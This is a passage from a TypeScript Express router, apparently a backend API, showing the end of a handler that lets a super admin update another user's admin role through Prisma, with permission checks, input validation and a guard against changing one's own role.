      const authReq = req as AuthRequest;
      const requestingUser = await prisma.user.findUnique({
        where: { id: authReq.user!.userId },
        select: { userType: true, adminRole: true },
      });
      if (
        !requestingUser ||
        requestingUser.userType !== "ADMIN" ||
        requestingUser.adminRole !== "SUPER_ADMIN"
      ) {
        return res.status(403).json({
          success: false,
          error: "Only Super Admin can update admin roles",
        });
      }

      const errors = validationResult(req);
      if (!errors.isEmpty()) {
        return res.status(400).json({
          success: false,
          error: "Validation failed",
          details: errors.array(),
        });
      }

      const id = req.params.id as string;
      const { adminRole } = req.body;

      // Prevent demoting yourself
      if (id === authReq.user!.userId) {
        return res.status(400).json({
          success: false,
          error: "Cannot change your own role",
        });
      }

      const admin = await prisma.user.update({
        where: { id },
        data: { adminRole: adminRole as AdminRole },
        select: {
          id: true,
          email: true,
          firstName: true,
          lastName: true,
          adminRole: true,
        },
      });

      res.json({ success: true, data: admin });
    } catch (error) {
      console.error("Update admin role error:", error);
      res
        .status(500)
        .json({ success: false, error: "Failed to update admin role" });
    }
  },
);

export default router;
